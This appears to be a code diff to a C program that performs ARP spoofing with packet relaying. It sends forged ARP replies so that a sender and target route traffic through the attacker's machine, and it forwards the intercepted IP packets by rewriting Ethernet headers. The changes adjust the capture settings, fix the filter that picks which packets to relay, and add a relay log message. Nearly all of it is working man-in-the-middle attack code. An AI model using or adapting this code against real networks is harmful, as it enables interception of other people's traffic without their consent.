@@ -8,8 +8,8 @@
 #include <sys/ioctl.h>			// local mac_ip
 #include <net/if.h>			// local mac_ip
 #include <unistd.h>			// [socket]close()
-//#include <iostream>
-//using namespace std;
+#include <iostream>
+using namespace std;
 
 #define INET_ADDR_LEN	4
 #define ALL_F 		"\xff\xff\xff\xff\xff\xff"
@@ -119,7 +119,7 @@ int main(int argc, char *argv[]) {
  
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	handle = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
 		return -1;
@@ -148,6 +148,8 @@ int main(int argc, char *argv[]) {
 
 	struct libnet_ethernet_hdr *eth_p;
 	arp_hdr *arp_p;
+	struct libnet_ipv4_hdr *ip_p;
+	uint32_t temp_ip;
 	while(1) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
@@ -157,6 +159,7 @@ int main(int argc, char *argv[]) {
 
 		eth_p = (struct libnet_ethernet_hdr*)packet;
 		arp_p = (arp_hdr*)(packet + LIBNET_ETH_H);
+		ip_p = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);
 		if(ntohs(eth_p->ether_type) == ETHERTYPE_ARP) {
 			if(!memcmp(eth_p->ether_shost, sender_mac, ETHER_ADDR_LEN)) // arp_sender_req
 				arp_rep(my_mac, target_ip, sender_mac, sender_ip);
@@ -164,9 +167,9 @@ int main(int argc, char *argv[]) {
 				arp_rep(my_mac, sender_ip, target_mac, target_ip);
 			continue;
 		}
-		else if(ntohs(eth_p->ether_type) != ETHERTYPE_IP || // !SpoofPacket = continue;
-			arp_p->tip == my_ip ||
-			memcmp(eth_p->ether_dhost, my_mac, ETHER_ADDR_LEN)) continue;
+		if(ntohs(eth_p->ether_type) != ETHERTYPE_IP || // !SpoofPacket = continue;
+		   !memcmp(&ip_p->ip_dst, &my_ip, INET_ADDR_LEN) || 
+		   memcmp(eth_p->ether_dhost, my_mac, ETHER_ADDR_LEN)) continue;
 
 		if(!memcmp(eth_p->ether_shost, sender_mac, ETHER_ADDR_LEN)) // sm = sm
 			memcpy(eth_p->ether_dhost, target_mac, ETHER_ADDR_LEN);
@@ -174,6 +177,7 @@ int main(int argc, char *argv[]) {
 			memcpy(eth_p->ether_dhost, sender_mac, ETHER_ADDR_LEN);
 		memcpy(eth_p->ether_shost, my_mac, ETHER_ADDR_LEN);
 		pcap_sendpacket(handle, packet, header->caplen);
+		cout<<"relay!\n";
 	}
 	pcap_close(handle);
 	return 0;
